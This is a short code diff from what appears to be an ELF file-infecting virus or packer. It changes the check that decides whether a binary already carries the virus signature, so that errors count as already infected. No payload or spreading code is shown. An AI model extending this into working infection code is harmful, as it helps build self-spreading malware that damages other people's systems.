@@ -165,9 +165,9 @@ int check_already_packed(char *s, size_t n, size_t virus_len){
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
 	//check if size is enoug
 	if (entry + DATA + 7*sizeof(size_t) + sig_len >= n)
-		return fail("invalid entry point");
+		return TRUE;
 	if (get_sig(s, n, virus_len, sig) == FALSE)
-		return FALSE;
+		return TRUE;
 	size_t *p = ((size_t *)(char*)(s + entry + DATA));
 	//print(sig);
 	//print(p + 7);
